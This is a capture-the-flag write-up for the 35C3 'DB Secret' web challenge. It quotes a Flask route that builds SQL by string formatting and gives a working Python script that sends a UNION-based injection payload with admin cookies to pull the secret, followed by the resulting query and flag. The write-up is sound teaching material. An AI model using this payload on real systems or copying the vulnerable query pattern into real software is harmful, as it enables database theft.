# DB Secret
Web

## Description:
> To enable secure microservices (or whatever, we don't know yet) over Wee in the future, we created a specific DB_SECRET, only known to us. This token is super important and extremely secret, hence the name. The only way an attacker could get hold of it is to serve good booze to the admins. Pretty sure it's otherwise well protected on our secure server.


## Solution:

This is a "Wee" challenge - see basic explanation [here](./Wee/).

Searching for this DB_SECRET, we find the following piece of code in the server:

```python
def init_db():
    with app.app_context():
        db = get_db()
        with open(MIGRATION_PATH, "r") as f:
            db.cursor().executescript(f.read())
        db.execute("CREATE TABLE `secrets`(`id` INTEGER PRIMARY KEY AUTOINCREMENT, `secret` varchar(255) NOT NULL)")
        db.execute("INSERT INTO secrets(secret) values(?)", (DB_SECRET,))
        db.commit()

```

It looks like we are looking for an SQL-injection vulnerability.

Scanning the code to search for such a vulnerability, we find:
```python
@app.route("/api/getprojectsadmin", methods=["POST"])
def getprojectsadmin():
    # ProjectsRequest request = ctx.bodyAsClass(ProjectsRequest.class);
    # ctx.json(paperbots.getProjectsAdmin(ctx.cookie("token"), request.sorting, request.dateOffset));
    name = request.cookies["name"]
    token = request.cookies["token"]
    user, username, email, usertype = user_by_token(token)

    json = request.get_json(force=True)
    offset = json["offset"]
    sorting = json["sorting"]

    if name != "admin":
        raise Exception("InvalidUserName")

    sortings = {
        "newest": "created DESC",
        "oldest": "created ASC",
        "lastmodified": "lastModified DESC"
    }
    sql_sorting = sortings[sorting]

    if not offset:
        offset = datetime.datetime.now()

    return jsonify_projects(query_db(
        "SELECT code, userName, title, public, type, lastModified, created, content FROM projects WHERE created < '{}' "
        "ORDER BY {} LIMIT 10".format(offset, sql_sorting), one=False), username, "admin")
```

Since we are already [logged in as admins](Logged_In.md), we can use this entry point and provide a specially crafted `offset` in order to perform the injection.

The code:
```python
import requests

cookie = {"name": "admin", "token": "vsfrhvlixgcakewqactbyotkdsrhjehq"}
r = requests.post('http://35.207.132.47/api/getprojectsadmin', json={"offset": "' union select secret, 1, 1, 1, 1, 1, 1, 1 from secrets limit 1 --", "sorting": "newest"}, cookies = cookie)
print(r.text)
```

This will produce the following query:
```sql
SELECT code, userName, title, public, type, lastModified, created, content 
FROM projects 
WHERE created < '' 
union select secret, 1, 1, 1, 1, 1, 1, 1 from secrets limit 1 --'ORDER BY {} LIMIT 10
```

The response:
```
[{"code":"35C3_ALL_THESE_YEARS_AND_WE_STILL_HAVE_INJECTIONS_EVERYWHERE__HOW???","content":1,"created":1,"lastModified":1,"public":1,"title":1,"type":1,"userName":1}]
```

The flag: 35C3_ALL_THESE_YEARS_AND_WE_STILL_HAVE_INJECTIONS_EVERYWHERE__HOW???